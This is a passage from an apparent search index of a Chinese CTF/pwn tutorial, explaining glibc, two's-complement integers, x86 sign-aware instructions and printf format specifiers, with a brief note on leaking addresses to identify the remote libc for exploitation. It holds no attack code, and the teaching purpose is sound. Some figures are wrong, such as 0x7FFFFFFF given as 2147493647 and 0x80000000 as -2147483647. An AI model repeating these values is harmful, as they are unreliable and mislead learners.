\u8fd0\u884c\u5e93\uff08CRT\uff09\u662f\u4e00\u5957\u5e9e\u5927\u7684\u4ee3\u7801\u5e93\uff0c\u4ee5\u652f\u6491\u7a0b\u5e8f\u80fd\u591f\u6b63\u5e38\u5730\u8fd0\u884c\u3002\u5176\u4e2d C \u8bed\u8a00\u6807\u51c6\u5e93\u5360\u636e\u4e86\u6700\u4e3b\u8981\u5730\u4f4d\u3002 \u5e38\u7528\u7684\u6807\u51c6\u5e93\u6587\u4ef6\u5934\uff1a \u6807\u51c6\u8f93\u5165\u8f93\u51fa\uff08stdio.h\uff09 \u5b57\u7b26\u64cd\u4f5c\uff08ctype.h\uff09 \u5b57\u7b26\u4e32\u64cd\u4f5c\uff08string.h\uff09 \u6570\u5b66\u51fd\u6570\uff08math.h\uff09 \u5b9e\u7528\u7a0b\u5e8f\u5e93\uff08stdlib.h\uff09 \u65f6\u95f4\uff0f\u65e5\u671f\uff08time.h\uff09 \u65ad\u8a00\uff08assert.h\uff09 \u5404\u79cd\u7c7b\u578b\u4e0a\u7684\u5e38\u6570\uff08limits.h & float.h\uff09 \u53d8\u957f\u53c2\u6570\uff08stdarg.h\uff09 \u975e\u5c40\u90e8\u8df3\u8f6c\uff08setjmp.h\uff09 glibc \u5373 GNU C Library\uff0c\u662f\u4e3a GNU \u64cd\u4f5c\u7cfb\u7edf\u5f00\u53d1\u7684\u4e00\u4e2a C \u6807\u51c6\u5e93\u3002glibc \u4e3b\u8981\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff0c\u4e00\u90e8\u5206\u662f\u5934\u6587\u4ef6\uff0c\u4f4d\u4e8e /usr/include \uff1b\u53e6\u4e00\u90e8\u5206\u662f\u5e93\u7684\u4e8c\u8fdb\u5236\u6587\u4ef6\u3002\u4e8c\u8fdb\u5236\u6587\u4ef6\u90e8\u5206\u4e3b\u8981\u662f C \u8bed\u8a00\u6807\u51c6\u5e93\uff0c\u6709\u52a8\u6001\u548c\u9759\u6001\u4e24\u4e2a\u7248\u672c\uff0c\u52a8\u6001\u7248\u672c\u4f4d\u4e8e /lib/libc.so.6 \uff0c\u9759\u6001\u7248\u672c\u4f4d\u4e8e /usr/lib/libc.a \u3002 \u5728\u6f0f\u6d1e\u5229\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u901a\u5e38\u6211\u4eec\u901a\u8fc7\u8ba1\u7b97\u76ee\u6807\u51fd\u6570\u5730\u5740\u76f8\u5bf9\u4e8e\u5df2\u77e5\u51fd\u6570\u5730\u5740\u5728\u540c\u4e00\u4e2a libc \u4e2d\u7684\u504f\u79fb\uff0c\u6765\u83b7\u5f97\u76ee\u6807\u51fd\u6570\u7684\u865a\u62df\u5730\u5740\uff0c\u8fd9\u65f6\u6211\u4eec\u9700\u8981\u8ba9\u672c\u5730\u7684 libc \u7248\u672c\u548c\u8fdc\u7a0b\u7684 libc \u7248\u672c\u76f8\u540c\uff0c\u53ef\u4ee5\u5148\u6cc4\u9732\u51e0\u4e2a\u51fd\u6570\u7684\u5730\u5740\uff0c\u7136\u540e\u5728 libcdb.com \u4e2d\u8fdb\u884c\u641c\u7d22\u6765\u5f97\u5230\u3002","title":"C \u8bed\u8a00\u6807\u51c6\u5e93"},{"location":"Tutorial/Material/Reverse/#_7","text":"\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cC \u8bed\u8a00\u4e2d\u7684\u6570\u5b57\u662f\u6709\u7b26\u53f7\u6570\uff0c\u4e0b\u9762\u6211\u4eec\u58f0\u660e\u4e00\u4e2a\u6709\u7b26\u53f7\u6574\u6570\u548c\u65e0\u7b26\u53f7\u6574\u6570\uff1a int var1 = 0; unsigned int var2 = 0; \u6709\u7b26\u53f7\u6574\u6570 \u53ef\u4ee5\u8868\u793a\u4e3a\u6b63\u6570\u6216\u8d1f\u6570 int \u7684\u8303\u56f4\uff1a -2,147,483,648 ~ 2,147,483,647 \u65e0\u7b26\u53f7\u6574\u6570 \u53ea\u80fd\u8868\u793a\u4e3a\u96f6\u6216\u6b63\u6570 unsigned int \u7684\u8303\u56f4\uff1a 0 ~ 4,294,967,295 signed \u6216\u8005 unsigned \u53d6\u51b3\u4e8e\u6574\u6570\u7c7b\u578b\u662f\u5426\u53ef\u4ee5\u643a\u5e26\u6807\u5fd7 +/- \uff1a Signed int signed int long Unsigned unit unsigned int unsigned long \u5728 signed int \u4e2d\uff0c\u4e8c\u8fdb\u5236\u6700\u9ad8\u4f4d\u88ab\u79f0\u4f5c\u7b26\u53f7\u4f4d\uff0c\u7b26\u53f7\u4f4d\u88ab\u8bbe\u7f6e\u4e3a 1 \u65f6\uff0c\u8868\u793a\u503c\u4e3a\u8d1f\uff0c\u5f53\u8bbe\u7f6e\u4e3a 0 \u65f6\uff0c\u503c\u4e3a\u975e\u8d1f\uff1a 0x7FFFFFFF = 2147493647 01111111111111111111111111111111 0x80000000 = -2147483647 10000000000000000000000000000000 0xFFFFFFFF = -1 11111111111111111111111111111111 \u4e8c\u8fdb\u5236\u8865\u7801\u4ee5\u4e00\u79cd\u9002\u5408\u4e8e\u4e8c\u8fdb\u5236\u52a0\u6cd5\u5668\u7684\u65b9\u5f0f\u6765\u8868\u793a\u8d1f\u6570\uff0c\u5f53\u4e00\u4e2a\u4e8c\u8fdb\u5236\u8865\u7801\u5f62\u5f0f\u8868\u793a\u7684\u8d1f\u6570\u548c\u4e0e\u5b83\u7684\u7edd\u5bf9\u503c\u76f8\u7b49\u7684\u6b63\u6570\u76f8\u52a0\u65f6\uff0c\u7ed3\u679c\u4e3a 0\u3002\u9996\u5148\u4ee5\u4e8c\u8fdb\u5236\u65b9\u5f0f\u5199\u51fa\u6b63\u6570\uff0c\u7136\u540e\u5bf9\u6240\u6709\u4f4d\u53d6\u53cd\uff0c\u6700\u540e\u52a0 1 \u5c31\u53ef\u4ee5\u5f97\u5230\u8be5\u6570\u7684\u4e8c\u8fdb\u5236\u8865\u7801\uff1a eg: 0x00123456 = 1193046 = 00000000000100100011010001010110 ~= 11111111111011011100101110101001 += 11111111111011011100101110101010 = -1193046 (0xFFEDCBAA) \u7f16\u8bd1\u5668\u9700\u8981\u6839\u636e\u53d8\u91cf\u7c7b\u578b\u4fe1\u606f\u7f16\u8bd1\u6210\u76f8\u5e94\u7684\u6307\u4ee4\uff1a \u6709\u7b26\u53f7\u6307\u4ee4 IDIV\uff1a\u5e26\u7b26\u53f7\u9664\u6cd5\u6307\u4ee4 IMUL\uff1a\u5e26\u7b26\u53f7\u4e58\u6cd5\u6307\u4ee4 SAL\uff1a\u7b97\u672f\u5de6\u79fb\u6307\u4ee4\uff08\u4fdd\u7559\u7b26\u53f7\uff09 SAR\uff1a\u53f3\u79fb\u53f3\u79fb\u6307\u4ee4\uff08\u4fdd\u7559\u7b26\u53f7\uff09 MOVSX\uff1a\u5e26\u7b26\u53f7\u6269\u5c55\u4f20\u9001\u6307\u4ee4 JL\uff1a\u5f53\u5c0f\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JLE\uff1a\u5f53\u5c0f\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JG\uff1a\u5f53\u5927\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JGE\uff1a\u5f53\u5927\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 \u65e0\u7b26\u53f7\u6307\u4ee4 DIV\uff1a\u9664\u6cd5\u6307\u4ee4 MUL\uff1a\u4e58\u6cd5\u6307\u4ee4 SHL\uff1a\u903b\u8f91\u5de6\u79fb\u6307\u4ee4 SHR\uff1a\u903b\u8f91\u53f3\u79fb\u6307\u4ee4 MOVZX\uff1a\u65e0\u7b26\u53f7\u6269\u5c55\u4f20\u9001\u6307\u4ee4 JB\uff1a\u5f53\u5c0f\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JBE\uff1a\u5f53\u5c0f\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JA\uff1a\u5f53\u5927\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 JAE\uff1a\u5f53\u5927\u4e8e\u6216\u7b49\u4e8e\u65f6\u8df3\u8f6c\u6307\u4ee4 32 \u4f4d\u673a\u5668\u4e0a\u7684\u6574\u578b\u6570\u636e\u7c7b\u578b\uff0c\u4e0d\u540c\u7684\u7cfb\u7edf\u53ef\u80fd\u4f1a\u6709\u4e0d\u540c\uff1a C \u6570\u636e\u7c7b\u578b \u6700\u5c0f\u503c \u6700\u5927\u503c \u6700\u5c0f\u5927\u5c0f char -128 127 8 bits short -32 768 32 767 16 bits int -2 147 483 648 2 147 483 647 16 bits long -2 147 483 648 2 147 483 647 32 bits long long -9 223 372 036 854 775 808 9 223 372 036 854 775 807 64 bits \u56fa\u5b9a\u5927\u5c0f\u7684\u6570\u636e\u7c7b\u578b\uff1a int [# of bits]_t int8_t, int16_t, int32_t uint[# of bits]_t uint8_t, uint16_t, uint32_t \u6709\u7b26\u53f7\u6574\u6570 \u65e0\u7b26\u53f7\u6574\u6570 \u66f4\u591a\u4fe1\u606f\u5728 stdint.h \u548c limits.h \u4e2d\uff1a man stdint.h cat /usr/include/stdint.h man limits.h cat /usr/include/limits.h \u4e86\u89e3\u6574\u6570\u7684\u7b26\u53f7\u548c\u5927\u5c0f\u662f\u5f88\u6709\u7528\u7684\uff0c\u5728\u540e\u9762\u7684\u76f8\u5173\u7ae0\u8282\u4e2d\u6211\u4eec\u4f1a\u4ecb\u7ecd\u6574\u6570\u6ea2\u51fa\u7684\u5185\u5bb9\u3002","title":"\u6574\u6570\u8868\u793a"},{"location":"Tutorial/Material/Reverse/#_8","text":"C \u6807\u51c6\u4e2d\u5b9a\u4e49\u4e86\u4e0b\u9762\u7684\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570\uff08\u53c2\u8003 man \uff13 printf \uff09\uff1a #include <stdio.h> int printf(const char *format, ...); int fprintf(FILE *stream, const char *format, ...); int dprintf(int fd, const char *format, ...); int sprintf(char *str, const char *format, ...); int snprintf(char *str, size_t size, const char *format, ...); #include <stdarg.h> int vprintf(const char *format, va_list ap); int vfprintf(FILE *stream, const char *format, va_list ap); int vdprintf(int fd, const char *format, va_list ap); int vsprintf(char *str, const char *format, va_list ap); int vsnprintf(char *str, size_t size, const char *format, va_list ap); fprintf() \u6309\u7167\u683c\u5f0f\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u5c06\u8f93\u51fa\u5199\u5165\u6d41\u4e2d\u3002\u4e09\u4e2a\u53c2\u6570\u4e3a\u6d41\u3001\u683c\u5f0f\u5b57\u7b26\u4e32\u548c\u53d8\u53c2\u5217\u8868\u3002 printf() \u7b49\u540c\u4e8e fprintf() \uff0c\u4f46\u662f\u5b83\u5047\u5b9a\u8f93\u51fa\u6d41\u4e3a stdout \u3002 sprintf() \u7b49\u540c\u4e8e fprintf() \uff0c\u4f46\u662f\u8f93\u51fa\u4e0d\u662f\u5199\u5165\u6d41\u800c\u662f\u5199\u5165\u6570\u7ec4\u3002\u5728\u5199\u5165\u7684\u5b57\u7b26\u4e32\u672b\u5c3e\u5fc5\u987b\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002 snprintf() \u7b49\u540c\u4e8e sprintf() \uff0c\u4f46\u662f\u5b83\u6307\u5b9a\u4e86\u53ef\u5199\u5165\u5b57\u7b26\u7684\u6700\u5927\u503c size \u3002\u5f53 size \u5927\u4e8e\u96f6\u65f6\uff0c\u8f93\u51fa\u5b57\u7b26\u8d85\u8fc7\u7b2c size-1 \u7684\u90e8\u5206\u4f1a\u88ab\u820d\u5f03\u800c\u4e0d\u4f1a\u5199\u5165\u6570\u7ec4\u4e2d\uff0c\u5728\u5199\u5165\u6570\u7ec4\u7684\u5b57\u7b26\u4e32\u672b\u5c3e\u4f1a\u6dfb\u52a0\u4e00\u4e2a\u7a7a\u5b57\u7b26\u3002 dprintf() \u7b49\u540c\u4e8e fprintf() \uff0c\u4f46\u662f\u5b83\u8f93\u51fa\u4e0d\u662f\u6d41\u800c\u662f\u4e00\u4e2a\u6587\u4ef6\u63cf\u8ff0\u7b26 fd \u3002 vfprintf() \u3001 vprintf() \u3001 vsprintf() \u3001 vsnprintf() \u3001 vdprintf() \u5206\u522b\u4e0e\u4e0a\u9762\u7684\u51fd\u6570\u5bf9\u5e94\uff0c\u53ea\u662f\u5b83\u4eec\u5c06\u53d8\u53c2\u5217\u8868\u6362\u6210\u4e86 va_list \u7c7b\u578b\u7684\u53c2\u6570\u3002","title":"\u683c\u5f0f\u5316\u8f93\u51fa\u51fd\u6570"},{"location":"Tutorial/Material/Reverse/#_9","text":"\u683c\u5f0f\u5b57\u7b26\u4e32\u662f\u7531\u666e\u901a\u5b57\u7b26\uff08ordinary character\uff09\uff08\u5305\u62ec % \uff09\u548c\u8f6c\u6362\u89c4\u5219\uff08conversion specification\uff09\u6784\u6210\u7684\u5b57\u7b26\u5e8f\u5217\u3002\u666e\u901a\u5b57\u7b26\u88ab\u539f\u5c01\u4e0d\u52a8\u5730\u590d\u5236\u5230\u8f93\u51fa\u6d41\u4e2d\u3002\u8f6c\u6362\u89c4\u5219\u6839\u636e\u4e0e\u5b9e\u53c2\u5bf9\u5e94\u7684\u8f6c\u6362\u6307\u793a\u7b26\u5bf9\u5176\u8fdb\u884c\u8f6c\u6362\uff0c\u7136\u540e\u5c06\u7ed3\u679c\u5199\u5165\u8f93\u51fa\u6d41\u4e2d\u3002 \u4e00\u4e2a\u8f6c\u6362\u89c4\u5219\u6709\u53ef\u9009\u90e8\u5206\u548c\u5fc5\u9700\u90e8\u5206\u7ec4\u6210\uff1a %[ \u53c2\u6570 ][ \u6807\u5fd7 ][ \u5bbd\u5ea6 ][ .\u7cbe\u5ea6 ][ \u957f\u5ea6 ] \u8f6c\u6362\u6307\u793a\u7b26 \uff08\u5fc5\u9700\uff09\u8f6c\u6362\u6307\u793a\u7b26 \u5b57\u7b26 \u63cf\u8ff0 d , i \u6709\u7b26\u53f7\u5341\u8fdb\u5236\u6570\u503c int \u3002' %d ' \u4e0e ' %i ' \u5bf9\u4e8e\u8f93\u51fa\u662f\u540c\u4e49\uff1b\u4f46\u5bf9\u4e8e scanf() \u8f93\u5165\u4e8c\u8005\u4e0d\u540c\uff0c\u5176\u4e2d %i \u5728\u8f93\u5165\u503c\u6709\u524d\u7f00 0x \u6216 0 \u65f6\uff0c\u5206\u522b\u8868\u793a 16 \u8fdb\u5236\u6216 8 \u8fdb\u5236\u7684\u503c\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a u \u5341\u8fdb\u5236 unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a f , F double \u578b\u8f93\u51fa 10 \u8fdb\u5236\u5b9a\u70b9\u8868\u793a\u3002' f ' \u4e0e ' F ' \u5dee\u5f02\u662f\u8868\u793a\u65e0\u7a77\u4e0e NaN \u65f6\uff0c' f ' \u8f93\u51fa ' inf ', ' infinity ' \u4e0e ' nan '\uff1b' F ' \u8f93\u51fa ' INF ', ' INFINITY ' \u4e0e ' NAN '\u3002\u5c0f\u6570\u70b9\u540e\u7684\u6570\u5b57\u4f4d\u6570\u7b49\u4e8e\u7cbe\u5ea6\uff0c\u6700\u540e\u4e00\u4f4d\u6570\u5b57\u56db\u820d\u4e94\u5165\u3002\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6\u3002\u5982\u679c\u7cbe\u5ea6\u4e3a 0 \u4e14\u6ca1\u6709 # \u6807\u8bb0\uff0c\u5219\u4e0d\u51fa\u73b0\u5c0f\u6570\u70b9\u3002\u5c0f\u6570\u70b9\u5de6\u4fa7\u81f3\u5c11\u4e00\u4f4d\u6570\u5b57 e , E double \u503c\uff0c\u8f93\u51fa\u5f62\u5f0f\u4e3a 10 \u8fdb\u5236\u7684([ - ]d.ddd e [ + / - ]ddd). E \u7248\u672c\u4f7f\u7528\u7684\u6307\u6570\u7b26\u53f7\u4e3a E \uff08\u800c\u4e0d\u662f e \uff09\u3002\u6307\u6570\u90e8\u5206\u81f3\u5c11\u5305\u542b 2 \u4f4d\u6570\u5b57\uff0c\u5982\u679c\u503c\u4e3a 0\uff0c\u5219\u6307\u6570\u90e8\u5206\u4e3a 00\u3002Windows \u7cfb\u7edf\uff0c\u6307\u6570\u90e8\u5206\u81f3\u5c11\u4e3a 3 \u4f4d\u6570\u5b57\uff0c\u4f8b\u5982 1.5e002\uff0c\u4e5f\u53ef\u7528 Microsoft \u7248\u7684\u8fd0\u884c\u65f6\u51fd\u6570 _set_output_format \u4fee\u6539\u3002\u5c0f\u6570\u70b9\u524d\u5b58\u5728 1 \u4f4d\u6570\u5b57\u3002\u5c0f\u6570\u70b9\u540e\u7684\u6570\u5b57\u4f4d\u6570\u7b49\u4e8e\u7cbe\u5ea6\u3002\u7cbe\u5ea6\u9ed8\u8ba4\u4e3a 6\u3002\u5982\u679c\u7cbe\u5ea6\u4e3a 0 \u4e14\u6ca1\u6709 # \u6807\u8bb0\uff0c\u5219\u4e0d\u51fa\u73b0\u5c0f\u6570\u70b9 g , G double \u578b\u6570\u503c\uff0c\u7cbe\u5ea6\u5b9a\u4e49\u4e3a\u5168\u90e8\u6709\u6548\u6570\u5b57\u4f4d\u6570\u3002\u5f53\u6307\u6570\u90e8\u5206\u5728\u95ed\u533a\u95f4 [-4,\u7cbe\u5ea6] \u5185\uff0c\u8f93\u51fa\u4e3a\u5b9a\u70b9\u5f62\u5f0f\uff1b\u5426\u5219\u8f93\u51fa\u4e3a\u6307\u6570\u6d6e\u70b9\u5f62\u5f0f\u3002' g ' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff0c' G ' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5c0f\u6570\u70b9\u53f3\u4fa7\u7684\u5c3e\u6570 0 \u4e0d\u88ab\u663e\u793a\uff1b\u663e\u793a\u5c0f\u6570\u70b9\u4ec5\u5f53\u8f93\u51fa\u7684\u5c0f\u6570\u90e8\u5206\u4e0d\u4e3a 0 x , X 16 \u8fdb\u5236 unsigned int \u3002' x ' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff1b' X ' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd\u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a o 8 \u8fdb\u5236 unsigned int \u3002\u5982\u679c\u6307\u5b9a\u4e86\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u7684\u6570\u5b57\u4e0d\u8db3\u65f6\u5728\u5de6\u4fa7\u8865 0\u3002\u9ed8\u8ba4\u7cbe\u5ea6\u4e3a 1\u3002\u7cbe\u5ea6\u4e3a 0 \u4e14\u503c\u4e3a 0\uff0c\u5219\u8f93\u51fa\u4e3a\u7a7a s \u5982\u679c\u6ca1\u6709\u7528 l \u6807\u5fd7\uff0c\u8f93\u51fa null \u7ed3\u5c3e\u5b57\u7b26\u4e32\u76f4\u5230\u7cbe\u5ea6\u89c4\u5b9a\u7684\u4e0a\u9650\uff1b\u5982\u679c\u6ca1\u6709\u6307\u5b9a\u7cbe\u5ea6\uff0c\u5219\u8f93\u51fa\u6240\u6709\u5b57\u8282\u3002\u5982\u679c\u7528\u4e86 l \u6807\u5fd7\uff0c\u5219\u5bf9\u5e94\u51fd\u6570\u53c2\u6570\u6307\u5411 wchar_t \u578b\u7684\u6570\u7ec4\uff0c\u8f93\u51fa\u65f6\u628a\u6bcf\u4e2a\u5bbd\u5b57\u7b26\u8f6c\u5316\u4e3a\u591a\u5b57\u8282\u5b57\u7b26\uff0c\u76f8\u5f53\u4e8e\u8c03\u7528 wcrtomb \u51fd\u6570 c \u5982\u679c\u6ca1\u6709\u7528 l \u6807\u5fd7\uff0c\u628a int \u53c2\u6570\u8f6c\u4e3a unsigned char \u578b\u8f93\u51fa\uff1b\u5982\u679c\u7528\u4e86 l \u6807\u5fd7\uff0c\u628a wint_t \u53c2\u6570\u8f6c\u4e3a\u5305\u542b\u4e24\u4e2a\u5143\u7d20\u7684 wchart_t \u6570\u7ec4\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u5143\u7d20\u5305\u542b\u8981\u8f93\u51fa\u7684\u5b57\u7b26\uff0c\u7b2c\u4e8c\u4e2a\u5143\u7d20\u4e3a null \u5bbd\u5b57\u7b26 p void * \u578b\uff0c\u8f93\u51fa\u5bf9\u5e94\u53d8\u91cf\u7684\u503c\u3002 printf(\"%p\", a) \u7528\u5730\u5740\u7684\u683c\u5f0f\u6253\u5370\u53d8\u91cf a \u7684\u503c\uff0c printf(\"%p\", &a) \u6253\u5370\u53d8\u91cf a \u6240\u5728\u7684\u5730\u5740 a , A double \u578b\u7684 16 \u8fdb\u5236\u8868\u793a\uff0c\"[\u2212]0xh.hhhh p\u00b1d\"\u3002\u5176\u4e2d\u6307\u6570\u90e8\u5206\u4e3a 10 \u8fdb\u5236\u8868\u793a\u7684\u5f62\u5f0f\u3002\u4f8b\u5982\uff1a1025.010 \u8f93\u51fa\u4e3a 0x1.004000p+10\u3002' a ' \u4f7f\u7528\u5c0f\u5199\u5b57\u6bcd\uff0c' A ' \u4f7f\u7528\u5927\u5199\u5b57\u6bcd n \u4e0d\u8f93\u51fa\u5b57\u7b26\uff0c\u4f46\u662f\u628a\u5df2\u7ecf\u6210\u529f\u8f93\u51fa\u7684\u5b57\u7b26\u4e2a\u6570\u5199\u5165\u5bf9\u5e94\u7684\u6574\u578b\u6307\u9488\u53c2\u6570\u6240\u6307\u7684\u53d8\u91cf % ' % ' \u5b57\u9762\u503c\uff0c\u4e0d\u63a5\u53d7\u4efb\u4f55\u9664\u4e86 \u53c2\u6570 \u4ee5\u5916\u7684\u90e8\u5206 \uff08\u53ef\u9009\uff09\u53c2\u6570 \u5b57\u7b26 \u63cf\u8ff0 n$ n \u662f\u7528\u8fd9\u4e2a\u683c\u5f0f\u8bf4\u660e\u7b26\u663e\u793a\u7b2c\u51e0\u4e2a\u53c2\u6570\uff1b\u8fd9\u4f7f\u5f97\u53c2\u6570\u53ef\u4ee5\u8f93\u51fa\u591a\u6b21\uff0c\u4f7f\u7528\u591a\u4e2a\u683c\u5f0f\u8bf4\u660e\u7b26\uff0c\u4ee5\u4e0d\u540c\u7684\u987a\u5e8f\u8f93\u51fa\u3002\u5982\u679c\u4efb\u610f\u4e00\u4e2a\u5360\u4f4d\u7b26\u4f7f\u7528\u4e86 \u53c2\u6570 \uff0c\u5219\u5176\u4ed6\u6240\u6709\u5360\u4f4d\u7b26\u5fc5\u987b\u4e5f\u4f7f\u7528 \u53c2\u6570 \u3002\u4f8b\uff1a printf(\"%2$d %2$#x; %1$d %1$#x\",16,17) \u4ea7\u751f \" 17 0x11; 16 0x10 \" \uff08\u53ef\u9009\uff09\u6807\u5fd7 \u5b57\u7b26 \u63cf\u8ff0 + \u603b\u662f\u8868\u793a\u6709\u7b26\u53f7\u6570\u503c\u7684 ' + ' \u6216 ' - ' \u53f7\uff0c\u7f3a\u7701\u60c5\u51b5\u662f\u5ffd\u7565\u6b63\u6570\u7684\u7b26\u53f7\u3002\u4ec5\u9002\u7528\u4e8e\u6570\u503c\u7c7b\u578b \u7a7a\u683c \u4f7f\u5f97\u6709\u7b26\u53f7\u6570\u7684\u8f93\u51fa\u5982\u679c\u6ca1\u6709\u6b63\u8d1f\u53f7\u6216\u8005\u8f93\u51fa 0 \u4e2a\u5b57\u7b26\uff0c\u5219\u524d\u7f00 1 \u4e2a\u7a7a\u683c\u3002\u5982\u679c\u7a7a\u683c\u4e0e ' + ' \u540c\u65f6\u51fa\u73b0\uff0c\u5219\u7a7a\u683c\u8bf4\u660e\u7b26\u88ab\u5ffd\u7565 - \u5de6\u5bf9\u9f50\u3002\u7f3a\u7701\u60c5\u51b5\u662f\u53f3\u5bf9\u9f50 # \u5bf9\u4e8e ' g ' \u4e0e ' G '\uff0c\u4e0d\u5220\u9664\u5c3e\u90e8 0 \u4ee5\u8868\u793a\u7cbe\u5ea6\u3002\u5bf9\u4e8e ' f ', ' F ', ' e ', ' E ', ' g ', ' G ', \u603b\u662f\u8f93\u51fa\u5c0f\u6570\u70b9\u3002\u5bf9\u4e8e ' o ', ' x ', ' X ', \u5728\u975e 0 \u6570\u503c\u524d\u5206\u522b\u8f93\u51fa\u524d\u7f00 0 , 0x \u548c 0X \u8868\u793a\u6570\u5236 0 \u5982\u679c \u5bbd\u5ea6 \u9009\u9879\u524d\u7f00\u4e3a 0 \uff0c\u5219\u5728\u5de6\u4fa7\u7528 0 \u586b\u5145\u76f4\u81f3\u8fbe\u5230\u5bbd\u5ea6\u8981\u6c42\u3002\u4f8b\u5982 printf(\"%2d\", 3) \u8f93\u51fa \" 3 \"\uff0c\u800c printf(\"%02d\", 3) \u8f93\u51fa \" 03 \"\u3002\u5982\u679c 0 \u4e0e - \u5747\u51fa\u73b0\uff0c\u5219 0 \u88ab\u5ffd\u7565\uff0c\u5373\u5de6\u5bf9\u9f50\u4f9d\u7136\u7528\u7a7a\u683c\u586b\u5145 \uff08\u53ef\u9009\uff09\u5bbd\u5ea6 \u662f\u4e00\u4e2a\u7528\u6765\u6307\u5b9a\u8f93\u51fa\u5b57\u7b26\u7684\u6700\u5c0f\u4e2a\u6570\u7684\u5341\u8fdb\u5236\u975e\u8d1f\u6574\u6570\u3002\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u591a\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6,\u5219\u6309\u5b9e\u9645\u4f4d\u6570\u8f93\u51fa\uff1b\u5982\u679c\u5b9e\u9645\u4f4d\u6570\u5c11\u4e8e\u5b9a\u4e49\u7684\u5bbd\u5ea6\u5219\u8865\u4ee5\u7a7a\u683c\u6216 0\u3002 \uff08\u53ef\u9009\uff09\u7cbe\u5ea6 \u7cbe\u5ea6\u662f\u7528\u6765\u6307\u793a\u6253\u5370\u5b57\u7b26\u4e2a\u6570\u3001\u5c0f\u6570\u4f4d\u6570\u6216\u8005\u6709\u6548\u6570\u5b57\u4e2a\u6570\u7684\u975e\u8d1f\u5341\u8fdb\u5236\u6574\u6570\u3002\u5bf9\u4e8e d \u3001 i \u3001 u \u3001 x \u3001 o \u7684\u6574\u578b\u6570\u503c\uff0c\u662f\u6307\u6700\u5c0f\u6570\u5b57\u4f4d\u6570\uff0c\u4e0d\u8db3\u7684\u4f4d\u8981\u5728\u5de6\u4fa7\u8865 0\uff0c\u5982\u679c\u8d85\u8fc7\u4e5f\u4e0d\u622a\u65ad\uff0c\u7f3a\u7701\u503c\u4e3a 1\u3002\u5bf9\u4e8e a , A , e , E , f , F \u7684\u6d6e\u70b9\u6570\u503c\uff0c\u662f\u6307\u5c0f\u6570\u70b9\u53f3\u8fb9\u663e\u793a\u7684\u6570\u5b57\u4f4d\u6570\uff0c\u5fc5\u8981\u65f6\u56db\u820d\u4e94\u5165\uff1b\u7f3a\u7701\u503c\u4e3a 6\u3002\u5bf9\u4e8e g , G \u7684\u6d6e\u70b9\u6570\u503c\uff0c\u662f\u6307\u6709\u6548\u6570\u5b57\u7684\u6700\u5927\u4f4d\u6570\u3002\u5bf9\u4e8e s \u7684\u5b57\u7b26\u4e32\u7c7b\u578b\uff0c\u662f\u6307\u8f93\u51fa\u7684\u5b57\u8282\u7684\u4e0a\u9650\uff0c\u8d85\u51fa\u9650\u5236\u7684\u5176\u5b83\u5b57\u7b26\u5c06\u88ab\u622a\u65ad\u3002\u5982\u679c\u57df\u5bbd\u4e3a * \uff0c\u5219\u7531\u5bf9\u5e94\u7684\u51fd\u6570\u53c2\u6570\u7684\u503c\u4e3a\u5f53\u524d\u57df\u5bbd\u3002\u5982\u679c\u4ec5\u7ed9\u51fa\u4e86\u5c0f\u6570\u70b9\uff0c\u5219\u57df\u5bbd\u4e3a 0\u3002 \uff08\u53ef\u9009\uff09\u957f\u5ea6 \u5b57\u7b26 \u63cf\u8ff0 hh \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a\u4ece char \u63d0\u5347\u7684 int \u6574\u578b\u53c2\u6570 h \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a\u4ece short \u63d0\u5347\u7684 int \u6574\u578b\u53c2\u6570 l \u5bf9\u4e8e\u6574\u6570\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a long \u6574\u578b\u53c2\u6570\u3002\u5bf9\u4e8e\u6d6e\u70b9\u7c7b\u578b\uff0c printf \u671f\u5f85\u4e00\u4e2a 